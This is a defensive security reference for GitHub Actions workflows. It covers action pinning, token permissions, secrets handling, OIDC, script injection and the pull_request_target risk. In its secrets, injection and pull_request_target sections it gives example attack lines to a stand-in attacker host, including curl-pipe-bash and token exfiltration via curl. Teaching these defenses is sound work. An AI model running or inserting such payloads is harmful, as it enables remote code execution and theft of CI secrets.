# Security

This is the most consequential reference in this skill. CI/CD systems are high-value attack surfaces — they hold secrets, deploy to production, and run third-party code. Mistakes here are how supply-chain compromises happen.

## Table of contents

- [The threat model](#the-threat-model)
- [Pinning third-party actions](#pinning-third-party-actions)
- [`GITHUB_TOKEN` and `permissions:`](#github_token-and-permissions)
- [Secrets handling](#secrets-handling)
- [OIDC: the right way to do cloud auth](#oidc-the-right-way-to-do-cloud-auth)
- [Script injection prevention](#script-injection-prevention)
- [The `pull_request_target` minefield](#the-pull_request_target-minefield)
- [Fork PR handling](#fork-pr-handling)
- [Artifact attestations](#artifact-attestations)
- [Self-hosted runner risks](#self-hosted-runner-risks)
- [Audit checklist](#audit-checklist)

## The threat model

Concrete things an attacker tries to do via a workflow:
1. **Steal secrets.** Exfiltrate cloud credentials, deploy keys, npm/PyPI tokens.
2. **Tamper with releases.** Inject a backdoor into a published artifact.
3. **Pivot.** Use the runner's network access to reach internal systems.
4. **Cryptojack.** Run miners on your runner minutes.
5. **Persistence.** Modify a workflow to leak secrets on every future run.

Common attack vectors:
- A compromised third-party action (or its dependencies) — supply chain.
- A malicious PR that triggers a privileged workflow.
- Untrusted input rendered into a shell command — injection.
- An unprotected `pull_request_target` that runs PR code.
- Long-lived cloud keys stored as secrets that leak via logs or fork PRs.
- A self-hosted runner reused across builds without state isolation.

The rest of this document is structured around defending against these.

## Pinning third-party actions

**Rule:** any action not in `actions/*` or `github/*` orgs must be pinned to a full 40-character commit SHA.

```yaml
# Good
- uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502  # v4.0.2

# Bad — tag is mutable, can be re-pointed
- uses: aws-actions/configure-aws-credentials@v4
```

Why: tags and branches are mutable references. An attacker who compromises the action's repo can re-point `v4` to malicious code; your next workflow run silently runs the malicious version. This has happened multiple times in the wild (e.g., the tj-actions/changed-files compromise in March 2025).

**First-party actions (`actions/checkout`, `actions/setup-node`, etc.)** are owned by GitHub itself; using major-version tags (`@v6`) is generally accepted practice, though SHA pinning is still safer.

**Comment with the version** so humans can read what's pinned:
```yaml
- uses: docker/build-push-action@4f58ea79222b3b9dc2c8bbdd6debcef730109a75  # v6.10.0
```

**Tooling:**
- [Dependabot](https://docs.github.com/en/code-security/dependabot) updates pinned SHAs automatically and opens PRs.
- [`pin-github-action`](https://github.com/mheap/pin-github-action) — CLI to convert tags to SHAs.
- The audit script (`scripts/audit_workflow.py`) flags unpinned third-party actions.

### What about reusable workflows?

Reusable workflows referenced via `org/repo/.github/workflows/foo.yml@ref` follow the same rules:
- Same-repo: `uses: ./.github/workflows/foo.yml` (no ref needed, runs from the same commit)
- Cross-repo: pin to a SHA.

## `GITHUB_TOKEN` and `permissions:`

The `GITHUB_TOKEN` is auto-generated for each workflow run. Its scopes are determined by the `permissions:` block — or by repo/org defaults if absent.

**Always declare `permissions:` explicitly.** Don't rely on defaults; defaults vary by repo settings.

### The minimal-default pattern

```yaml
permissions:
  contents: read
```

Add only what's needed:

```yaml
permissions:
  contents: read
  pull-requests: write    # for commenting on PRs
  id-token: write         # for OIDC

jobs:
  publish:
    permissions:
      contents: write     # job-level overrides workflow-level entirely
      packages: write
```

### Job-level vs workflow-level

A job-level `permissions:` block **replaces** the workflow-level block, not merges with it. If you set `permissions: { id-token: write }` at the job level, the job has *only* `id-token: write` — no `contents: read`, no anything else. This is a common foot-gun.

Pattern: set the broadest needed defaults at the workflow level, and override only when a job needs different scopes.

### Permission scopes reference

| Scope | What it controls |
|---|---|
| `actions: write` | Cancel/re-run workflows |
| `attestations: write` | Generate artifact attestations |
| `checks: write` | Create check runs |
| `contents: read/write` | Read/write repo contents (code, releases) |
| `deployments: write` | Create deployments |
| `id-token: write` | Request an OIDC token (cloud auth) |
| `issues: write` | Create/comment on issues |
| `packages: write` | Push to GHCR / GitHub Packages |
| `pages: write` | Deploy to GitHub Pages |
| `pull-requests: write` | Create/comment on PRs |
| `security-events: write` | Upload SARIF to code scanning |
| `statuses: write` | Set commit statuses |

Full list: [docs.github.com/actions/reference/workflows-and-actions/workflow-syntax#permissions](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#permissions).

## Secrets handling

### Where secrets live

- **Repository secrets** — accessible from any workflow in the repo.
- **Organization secrets** — accessible from a defined set of repos in the org.
- **Environment secrets** — only accessible to jobs with `environment: <name>` set, and only after deployment protection rules (manual approval, branch restriction) pass.
- **Codespaces secrets** — separate from Actions; not relevant here.

**Recommendation:** put production secrets in a *protected environment* (with required reviewers and branch restrictions). This prevents a malicious PR or accidental change to a less-restricted workflow from being able to use prod secrets.

### Secrets are masked, not invisible

GitHub's log redaction replaces the literal value of any secret string with `***`. Limitations:
- Doesn't redact transformations: `echo "SECRET" | base64` will print the base64-encoded secret in plaintext.
- Doesn't redact substrings — if your secret is `pass`, every occurrence of `pass` in logs becomes `***` (rare, but odd).
- Doesn't redact at the network layer — if you `curl https://attacker.example/?token=$SECRET`, the URL is in the runner's outbound traffic and possibly in third-party action logs.

**Defense:**
- Never `echo "$SECRET"` even for debug.
- Use `::add-mask::` for secrets you compute at runtime: `echo "::add-mask::$dynamic_secret"`.
- Don't pass secrets as command-line arguments where they could appear in `ps`/process listings; use environment variables.
- Don't store secrets in artifacts.

### Secrets in reusable workflows

A reusable workflow doesn't automatically inherit secrets from its caller. Two ways:

```yaml
# Caller passes specific secrets
jobs:
  call:
    uses: ./.github/workflows/deploy.yml
    secrets:
      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}

# Caller passes ALL its secrets
jobs:
  call:
    uses: ./.github/workflows/deploy.yml
    secrets: inherit
```

`secrets: inherit` is convenient but expansive. Prefer explicit passing for cross-repo reusable workflows; reserve `inherit` for trusted same-org or same-repo reuse.

## OIDC: the right way to do cloud auth

OpenID Connect federation lets your workflow request a short-lived token from GitHub and exchange it for cloud credentials. **No long-lived keys stored as secrets.**

### Why OIDC beats long-lived keys

| Concern | Long-lived keys | OIDC |
|---|---|---|
| Lifetime | indefinite (until rotated) | typically 1h |
| Blast radius if leaked | full account, until rotated | a single workflow run |
| Rotation | manual, painful | automatic |
| Audit trail | "the key was used" | "this workflow run used this token" |

### Workflow side

```yaml
permissions:
  id-token: write    # required to request the OIDC token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v6
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502  # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
          aws-region: us-east-1
      - run: aws s3 sync ./dist s3://my-bucket/
```

### Cloud side (one-time setup)

- **AWS:** create an OIDC identity provider for `token.actions.githubusercontent.com`, then a role with a trust policy scoping which repos/branches/environments can assume it. See template `cd-aws-oidc.yml`.
- **Azure:** create a federated credential on an app registration, scoped to a specific repo/branch/environment.
- **GCP:** create a Workload Identity Pool and Provider, scoped via attribute conditions to your repo.

Trust-policy scoping is critical — without it, *any* GitHub workflow could potentially request your cloud credentials. Always condition the trust on `repo:owner/name`, `ref:refs/heads/main`, or `environment:production`.

### Other OIDC consumers

- **PyPI** — Trusted Publishing (no API token).
- **npm** — provenance via OIDC.
- **HashiCorp Vault** — JWT auth backend.
- **JFrog, Octopus Deploy, etc.**

See [deployment-patterns.md](deployment-patterns.md) for per-cloud setups.

## Script injection prevention

Anything from `github.event.*`, `github.head_ref`, `inputs.*` (when from `workflow_dispatch`), and `github.actor` (less commonly) can be attacker-controlled. Interpolating these values directly into a `run:` block is a shell injection.

### Vulnerable

```yaml
- run: |
    echo "PR title: ${{ github.event.pull_request.title }}"
```

```audit-example -- Documents the canonical workflow-interpolation shell-injection attack: a PR title containing curl-pipe-shell syntax that gets interpolated into a workflow step and executed. The auditor flags the curl-pipe-shell pattern; the attack illustration here is the exact pattern being documented.
If a PR title is `"; curl https://attacker.example | bash; #`, the interpolation produces:

echo "PR title: "; curl https://attacker.example | bash; #"

The `curl | bash` runs with full secrets and token access.
```

### Safe pattern: pass through env

```yaml
- name: Check PR title
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "PR title: $TITLE"
    if [[ "$TITLE" =~ ^bugfix/ ]]; then ...
```

The env var is set without shell interpretation; the `run:` block sees it as a regular variable. Always quote: `"$TITLE"`.

### Safe pattern: pass to an action

```yaml
- uses: some-org/check-title@SHA
  with:
    title: ${{ github.event.pull_request.title }}
```

Action inputs are passed via env (`INPUT_TITLE`), not interpolated into shell.

### Untrusted-input list

These contexts can carry attacker-controlled content:
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.pull_request.head.ref` (branch name)
- `github.event.issue.title`, `.body`
- `github.event.commits.*.message`, `.author.name`, `.author.email`
- `github.event.head_commit.message`
- `github.event.discussion.body`
- `github.event.review.body`, `.comment.body`
- `github.head_ref` (PR source branch name)
- `github.actor`, `github.triggering_actor` (technically validated as username, but treat as untrusted)
- Workflow inputs from `workflow_dispatch` triggered by an attacker

If you must use these, route through env vars.

## The `pull_request_target` minefield

`pull_request_target` runs in the *base* repo's context with full token + secret access on every PR — including from forks. This is by design (so labelers and welcome-bots work for forks), but it makes any unsafe step catastrophic.

### Catastrophic pattern

```yaml
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
        with:
          ref: ${{ github.event.pull_request.head.sha }}    # checks out PR code
      - run: npm install                                     # ☠️ runs PR's package.json scripts
      - run: npm test                                        # ☠️ runs PR's test code
```

`npm install` executes lifecycle scripts from the PR's `package.json`. The PR author can replace `prepare` with `curl https://attacker.example/exfil?token=$AWS_SESSION_TOKEN` and steal everything.

### Safe patterns

**Pattern 1:** Don't check out the PR head at all. Run trusted code from the base only.

```yaml
on: pull_request_target
jobs:
  label:
    permissions:
      pull-requests: write
    steps:
      - uses: actions/labeler@SHA   # action operates on PR metadata, doesn't run PR code
```

**Pattern 2:** Two-workflow split. Build/test in `pull_request` (no secrets); privileged comment/deploy in `workflow_run` after the first succeeds.

```yaml
# .github/workflows/ci.yml
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - run: npm ci && npm test
      - uses: actions/upload-artifact@v4
        with: { name: results, path: results.json }

# .github/workflows/comment.yml
on:
  workflow_run:
    workflows: [CI]
    types: [completed]
permissions:
  pull-requests: write
jobs:
  comment:
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    steps:
      - name: Download artifact
        uses: actions/download-artifact@v5
        with:
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}
          name: results
      - run: ./post-comment.sh
```

**Pattern 3:** Approval gate via deployment environment. Wrap the privileged steps in an `environment:` with required reviewers; CI can't proceed without manual approval.

## Fork PR handling

For PRs from forks of public repos:

- The `GITHUB_TOKEN` is read-only.
- Secrets are not exposed.
- Workflows from new contributors require maintainer approval before they run (default for public repos; configurable).

This is a feature, not a limitation. Don't try to "fix" it by switching to `pull_request_target`. Instead, design CI so that the PR build doesn't *need* secrets — use OIDC if you must publish previews, or split into two workflows as above.

## Artifact attestations

Generate cryptographic attestations for build outputs to prove they came from your CI:

```yaml
permissions:
  attestations: write
  id-token: write
  contents: read

steps:
  - run: ./build.sh
  - uses: actions/attest-build-provenance@SHA
    with:
      subject-path: 'dist/myapp'
```

Attestations are a Sigstore-backed audit trail. Useful for: container images (verify with `gh attestation verify`), npm packages (provenance badge), supply-chain compliance (SLSA).

## Self-hosted runner risks

Self-hosted runners are convenient but introduce risks GitHub-hosted runners avoid:

- **Persistence between jobs.** Files left behind, processes still running, cached secrets in env. Always use ephemeral runners (e.g., Actions Runner Controller with `ephemeral: true`) or aggressively reset state.
- **Network access.** A self-hosted runner inside your VPC has access to your internal network. A compromised job has the same access. Isolate runners in a separate subnet with limited reach.
- **Public repo + self-hosted = arbitrary code execution.** Anyone who can open a PR can run code on your runner. **Never use self-hosted runners on public repositories.** GitHub explicitly warns about this.
- **Image hardening.** Patch the OS, restrict installed packages, monitor.

See [runners.md](runners.md) for runner architecture and ARC.

## Audit checklist

When reviewing any workflow:

- [ ] All third-party actions pinned to a 40-char SHA.
- [ ] Explicit `permissions:` block; minimal scopes.
- [ ] No secrets logged or echoed.
- [ ] No `${{ github.event.* }}` or `${{ github.head_ref }}` interpolated into `run:` blocks (use env).
- [ ] No `pull_request_target` checking out PR code unless guarded by an approval gate.
- [ ] OIDC used instead of long-lived cloud keys where supported.
- [ ] Production secrets in a protected environment (with reviewers, branch restrictions).
- [ ] Self-hosted runners not used on public repos.
- [ ] Self-hosted runners ephemeral or freshly reset.
- [ ] No `pwd`-globs (e.g. `actions/cache` keys without lockfile hashes that could be poisoned).
- [ ] No deprecated patterns: `set-output`, `save-state`, Node 12/16 actions.
- [ ] `actions/checkout` doesn't `persist-credentials: true` (default is true) when the token would have more scopes than needed for downstream steps.

Run `scripts/audit_workflow.py <path>` for an automated pass.
